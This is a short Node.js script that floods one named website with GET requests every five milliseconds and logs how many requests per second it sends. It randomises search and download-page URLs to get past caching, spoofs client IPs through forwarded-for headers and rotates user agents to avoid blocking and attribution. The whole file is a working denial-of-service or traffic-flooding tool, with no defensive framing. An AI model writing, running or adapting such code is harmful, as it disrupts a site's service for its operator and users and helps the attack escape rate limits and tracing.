const { default: axios } = require("axios");
const ip = require("./functions/ip");
const uid = require("harsh-uid");
const randomUseragent = require("random-useragent");

function generateRandomNumber(length = 4) {
  let result = "";
  for (let i = 0; i < length; i++) {
    result += Math.floor(Math.random() * 10); // Generate a random digit between 0 and 9
  }
  return result;
}

let req = 0;
let time = 0;

const checkSpeed = () => {
  time++;
  const curSpeed = `${Math.round(req / time)} req per second`;
  console.log("Cuurent speed: " + curSpeed);
};

setInterval(checkSpeed, 1000);

const hitURL = async () => {
  try {
    const urls = [
      //   `https://www.filmyfly.durban/?to-page=${
      //     Math.floor(Math.random() * 1000) + 1
      //   }`,
      `https://www.filmyfly.durban/site-1.html?to-search=${uid(1)}`,
      `https://www.filmyfly.durban/page-download/${generateRandomNumber()}/${uid()}.html`,
      //   `https://www.filmyfly.durban/`,
    ];

    const _ip = ip();

    const url = urls[Math.floor(Math.random() * urls.length)];

    axios
      .get(url, {
        headers: {
          Referer: url,
          "x-forwarded-for": _ip,
          "X-Real-IP": _ip,
          "User-Agent": randomUseragent.getRandom(),
          origin: "https://www.filmyfly.durban",
          "Accept-Language": "en-US,en;q=0.9",
          "Accept-Encoding": "gzip, deflate, br",
          "Cache-Control": "no-cache",
        },
      })
      .then(() => {})
      .catch((err) => {});
    req++;
  } catch (err) {
    console.log("🚀 ~ file: durban.js:5 ~ hitURL ~ err:", err);
    // console.log("Fail");
  }
};

// for (let i = 0; i < 5; i++) {
setInterval(hitURL, 5);
// }
